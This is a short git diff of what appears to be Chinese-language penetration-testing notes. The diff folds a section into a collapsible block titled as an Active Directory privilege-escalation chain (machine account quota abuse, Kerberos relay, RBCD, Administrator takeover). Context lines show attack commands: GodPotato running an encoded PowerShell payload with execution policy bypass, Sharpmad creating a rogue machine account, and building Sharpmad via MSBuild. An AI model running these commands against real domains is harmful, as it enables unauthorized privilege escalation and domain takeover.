@@ -105,6 +105,11 @@ PS C:\Windows\tasks> .\GodPotato-NET4.exe -cmd 'powershell -exec bypass -enc <Ba
 ```
 ————————————————————————————————————
 #### From Bruno
+
+<details>
+
+<summary>一个典型的 AD 提权链（MAQ + COM → Kerberos Relay → RBCD → 接管 Administrator）</summary>
+
 ```
 Step 1：创建机器账户（MAQ 利用）
 ./Sharpmad.exe MAQ -Action new -MachineAccount roguecomputer -MachinePassword xiaohei
@@ -134,3 +139,7 @@ PS C:\programdata> Expand-Archive sharpmad.zip //解压
 PS C:\programdata> ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe //生成.exe的默认路径
 PS C:\programdata> .\MSBuild.exe sharpmad/sharpmad/Sharpmad.csproj
 ```
+
+</details>
+
+————————————————————————————————————
